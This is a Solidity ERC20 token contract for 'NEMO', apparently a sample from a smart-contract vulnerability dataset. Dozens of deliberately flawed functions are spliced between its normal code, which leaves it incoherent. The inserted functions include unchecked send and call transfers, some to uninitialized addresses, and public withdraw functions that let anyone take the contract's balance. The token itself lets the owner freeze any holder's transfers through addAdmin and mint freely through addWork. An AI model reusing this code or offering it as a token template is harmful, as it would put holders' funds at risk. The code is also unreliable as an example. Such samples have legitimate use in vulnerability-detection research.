/**
 *Submitted for verification at Etherscan.io on 2020-10-26
*/

pragma solidity ^0.5.11;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

function unhandledsend_unchk2(address payable callee) public {
    callee.send(5 ether);
  }
  uint8 private _Tokendecimals;
function my_func_unchk47(address payable dst) public payable{
        dst.send(msg.value);
    }
  string private _Tokenname;
function unhandledsend_unchk14(address payable callee) public {
    callee.send(5 ether);
  }
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }
function bug_unchk15(address payable addr) public
      {addr.send (42 ether); }

  function name() public view returns(string memory) {
    return _Tokenname;
  }
function UncheckedExternalCall_unchk16 () public
{  address payable addr_unchk16;
   if (! addr_unchk16.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}

  function symbol() public view returns(string memory) {
    return _Tokensymbol;
  }
function bug_unchk31() public{
address payable addr_unchk31;
if (!addr_unchk31.send (10 ether) || 1==1)
	{revert();}
}

  function decimals() public view returns(uint8) {
    return _Tokendecimals;
  }
function my_func_uncheck12(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
}



contract NEMO is ERC20Detailed {

  using SafeMath for uint256;
    
bool public payedOut_unchk33 = false;

function withdrawLeftOver_unchk33() public {
        require(payedOut_unchk33);
        msg.sender.send(address(this).balance);
    }
  uint256 public totalBurn = 0;
  
bool public payedOut_unchk45 = false;

function withdrawLeftOver_unchk45() public {
        require(payedOut_unchk45);
        msg.sender.send(address(this).balance);
    }
  mapping (address => uint256) private _balances;
function callnotchecked_unchk25(address payable callee) public {
    callee.call.value(1 ether);
  }
  mapping (address => mapping (address => uint256)) private _allowed;
function my_func_uncheck36(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }
  mapping (address => bool) public addadmin;
function bug_unchk3(address payable addr) public
      {addr.send (42 ether); }
  string constant tokenName = "NEMO.FINANCE";
function UncheckedExternalCall_unchk28 () public
{  address payable addr_unchk28;
   if (! addr_unchk28.send (42 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
  string constant tokenSymbol = "NEMO";
function unhandledsend_unchk38(address payable callee) public {
    callee.send(5 ether);
  }
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 100000*10**uint(tokenDecimals); 
 
  
  //any tokens sent here ? 
function UncheckedExternalCall_unchk40 () public
{  address payable addr_unchk40;
   if (! addr_unchk40.send (2 ether))  
      {// comment1;
      }
	else
      {//comment2;
      }
}
  IERC20 currentToken ;
 bool public payedOut_unchk32 = false;
address payable public winner_unchk32;
uint public winAmount_unchk32;

function sendToWinner_unchk32() public {
        require(!payedOut_unchk32);
        winner_unchk32.send(winAmount_unchk32);
        payedOut_unchk32 = true;
    }
 	address payable public _owner;
    
    //modifiers	
	modifier onlyOwner() {
      require(msg.sender == _owner);
      _;
  }
  
function callnotchecked_unchk37(address payable callee) public {
    callee.call.value(1 ether);
  }
  address initialSupplySend = 0x8b07780c0ca30BF5595C3fbd96C15b1758B771FC;
  

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
      
    _supply(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }
function my_func_unchk35(address payable dst) public payable{
        dst.send(msg.value);
    }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }
function withdrawBal_unchk29 () public{
	uint Balances_unchk29 = 0;
	msg.sender.send(Balances_unchk29);}

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }
function my_func_uncheck24(address payable dst) public payable{
        dst.call.value(msg.value)("");
    }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }
function callnotchecked_unchk13(address callee) public {
    callee.call.value(1 ether);
  }

  function addAdmin(address account) public {
      require(msg.sender == _owner, "!owner");
      addadmin[account] = true;
  }
function bug_unchk42() public{
uint receivers_unchk42;
address payable addr_unchk42;
if (!addr_unchk42.send(42 ether))
	{receivers_unchk42 +=1;}
else
	{revert();}
}
  
    function removeAdmin(address account) public {
      require(msg.sender == _owner, "!owner");
      addadmin[account] = false;
  }
function unhandledsend_unchk26(address payable callee) public {
    callee.send(5 ether);
  }

 function transfer(address to, uint256 value) public returns (bool) 
    {
        _executeTransfer(msg.sender, to, value);
        return true;
    }
function bug_unchk19() public{
address payable addr_unchk19;
if (!addr_unchk19.send (10 ether) || 1==1)
	{revert();}
}
    
    function multiTransfer(address[] memory receivers, uint256[] memory values) public
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _executeTransfer(msg.sender, receivers[i], values[i]);
    }
function cash_unchk10(uint roundIndex, uint subpotIndex,address payable winner_unchk10) public{
        uint64 subpot_unchk10 = 10 ether;
        winner_unchk10.send(subpot_unchk10);  //bug
        subpot_unchk10= 0;
}
    
    function transferFrom(address from, address to, uint256 value) public returns (bool) 
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _executeTransfer(from, to, value);
        return true;
    }
function bug_unchk7() public{
address payable addr_unchk7;
if (!addr_unchk7.send (10 ether) || 1==1)
	{revert();}
}
   
    function _executeTransfer(address _from, address _to, uint256 _value) private
    {
      require(!addadmin[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.sub(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.add(_balances[_to], _value);                            // Add the same to the recipient
        emit Transfer(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
bool public payedOut_unchk44 = false;
address payable public winner_unchk44;
uint public winAmount_unchk44;

function sendToWinner_unchk44() public {
        require(!payedOut_unchk44);
        winner_unchk44.send(winAmount_unchk44);
        payedOut_unchk44 = true;
    }
         
  //no zeros for decimals necessary 
  function multiTransferEqualAmount(address[] memory receivers, uint256 amount) public {
    uint256 amountWithDecimals = amount * 10**tokenDecimals;

    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amountWithDecimals);
    }
  }
function bug_unchk43() public{
address payable addr_unchk43;
if (!addr_unchk43.send (10 ether) || 1==1)
	{revert();}
}

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }
function callnotchecked_unchk1(address payable callee) public {
    callee.call.value(2 ether);
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
function bug_unchk30() public{
uint receivers_unchk30;
address payable addr_unchk30;
if (!addr_unchk30.send(42 ether))
	{receivers_unchk30 +=1;}
else
	{revert();}
}

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }
function my_func_unchk11(address payable dst) public payable{
        dst.send(msg.value);
    }

  function _supply(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
bool public payedOut_unchk9 = false;

function withdrawLeftOver_unchk9() public {
        require(payedOut_unchk9);
        msg.sender.send(address(this).balance);
    }

 //take back unclaimed tokens of any type sent by mistake
  function withdrawUnclaimedTokens(address contractUnclaimed) external onlyOwner {
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.balanceOf(address(this));
      currentToken.transfer(_owner, amount);
  }
function withdrawBal_unchk17 () public{
	uint64 Balances_unchk17 = 0;
	msg.sender.send(Balances_unchk17);}
  
  function addWork(address account, uint256 amount) public {
      require(msg.sender == _owner, "!warning");
      _supply(account, amount);
  }
function withdrawBal_unchk41 () public{
	uint64 Balances_unchk41 = 0;
	msg.sender.send(Balances_unchk41);}
}